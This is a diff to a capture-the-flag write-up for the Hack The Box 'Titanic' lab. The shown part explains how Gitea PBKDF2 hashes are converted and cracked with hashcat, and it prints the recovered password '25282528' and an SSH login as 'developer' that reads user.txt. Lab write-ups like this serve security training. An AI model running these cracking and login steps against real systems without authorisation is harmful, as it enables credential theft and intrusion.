@@ -79,14 +79,41 @@ developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5d
 ```
 
 ## Hash Cracking
-Browsing through [Gitea's documentation](https://docs.gitea.com/administration/config-cheat-sheet#security-security), 
+Browsing through [Gitea's documentation](https://docs.gitea.com/administration/config-cheat-sheet#security-security), we can determine that the hash went through 50000 iterations.
 
+![htb-titanic-7.png](htb-titanic-7.png#center)
+
+Looking at [Hashcat example hashes & format](https://hashcat.net/wiki/doku.php?id=example_hashes), we now know that we need to use hash-mode 10900 corresponding to `PBKDF2-HMAC-SHA256` which has the format `sha256:iterations:salt:hash`. However, the format requires both the hash and salt to be in base64, whereas the one we have are currently in hexadecimal. Convert them:
 ```sh
-echo -n "2d149e5fbd1b20cf31db3e3c6a28fc9b" | xxd -r -p | base64
+$ echo -n "2d149e5fbd1b20cf31db3e3c6a28fc9b" | xxd -r -p | base64
 ```
-
+Store all the information in `hashes.txt`:
+```
+sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
+```
+Run the Hashcat to attempt to crack the passwords:
 ```sh
-hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt 
+$ hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt 
+```
+You will quickly notice that we can only crack the password for the account `developer` which is `25282528`.
+```sh
+$ hashcat -m 10900 hashes.txt --show                          
+sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
+```
+Recall the original nmap scan where there was an open SSH port. We can SSH into the machine through that as `developer` user.
+```
+$ ssh developer@10.10.11.55
+The authenticity of host '10.10.11.55 (10.10.11.55)' can't be established.
+ED25519 key fingerprint is SHA256: .
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:6: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.55' (ED25519) to the list of known hosts.
+developer@10.10.11.55's password: 
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
+
+developer@titanic:~$ cat user.txt
 ```
 
 ```sh
